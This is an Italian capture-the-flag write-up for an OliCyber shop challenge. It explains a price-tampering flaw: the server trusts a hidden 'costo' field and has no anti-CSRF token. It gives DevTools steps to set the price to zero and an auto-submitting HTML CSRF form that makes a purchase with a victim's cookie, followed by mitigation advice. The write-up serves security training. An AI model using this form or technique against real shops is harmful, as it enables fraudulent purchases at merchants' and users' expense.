# CSRF / Parameter Tampering (Client-Side Trust)

### 1. La Vulnerabilità (In sintesi)
L'applicazione espone un form di acquisto che invia l'`id` dell'articolo e il suo `costo` (tramite `<input type="hidden">`) alla pagina `buy.php`. Il server si fida ciecamente del valore `costo` ricevuto nella richiesta POST (Client-Side Trust) senza validarlo con un listino prezzi locale (Server-Side). Inoltre, non c'è alcun token anti-CSRF.

### 2. Exploitation (Pratica)

**Soluzione Principale (Parameter Tampering Manuale):**
1. Aprire F12 / DevTools sul browser e ispezionare il form di acquisto della "Bandiera anonymous".
2. Trovare il campo: `<input type="hidden" name="costo" value="1000">`
3. Modificare il `value` in un importo abbordabile, es: `0` o `10`.
4. Cliccare il tasto Invia (ACQUISTA) nel form. Il server sottrarrà solo il valore manomesso restituendo l'oggetto.

**Soluzione Secondaria (Vero CSRF cross-site):**
Creando e distribuendo una pagina malevola come la seguente a un utente autenticato, l'acquisto avverrebbe a sua insaputa usando il suo cookie:
```html
<form id="csrf" action="http://shops.challs.olicyber.it/buy.php" method="POST">
  <input type="hidden" name="id" value="2">
  <input type="hidden" name="costo" value="0">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### 3. Mitigazione
Mai fidarsi del client per parametri legati alla business logic (prezzi, ruoli): il prezzo deve essere cercato server-side in base all'`id`. Utilizzare Token anti-CSRF univoci ad ogni sessione per prevenire richieste forgiate esternamente.
